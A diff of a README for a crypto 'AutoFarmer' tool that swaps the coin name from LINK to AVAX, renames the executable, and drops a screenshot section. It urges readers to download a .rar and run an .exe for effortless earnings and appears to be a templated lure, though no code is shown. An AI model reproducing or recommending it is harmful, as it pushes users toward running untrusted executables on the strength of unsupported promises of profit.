@@ -1,6 +1,6 @@
-# 🚀 Chainlink AutoFarmer | Fully Automatic Farming Tool
+# 🚀 AVAX AutoFarmer | Fully Automatic Farming Tool
 
-### 💰 Earn LINK effortlessly with this automated tool!
+### 💰 Earn AVAX effortlessly with this automated tool!
 
 ---
 
@@ -16,7 +16,7 @@
 ## 🛠 Setup Instructions:
 ### 🔹 Windows (.exe) - Recommended:
 1️⃣ Download and extract the `.rar` file.  
-2️⃣ Run `LINK_AutoFarmer.exe`.  
+2️⃣ Run `AVAX_AutoFarmer.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
 ### 🔹 Alternative Python Method:
@@ -24,12 +24,6 @@
 pip install -r requirements.txt
 python src/main.py
 ```
-
----
-
-## 🖼 Preview:
-![Banner](assets/banner.png)  
-![Screenshot](assets/screenshot.png)  
 
 ---
 
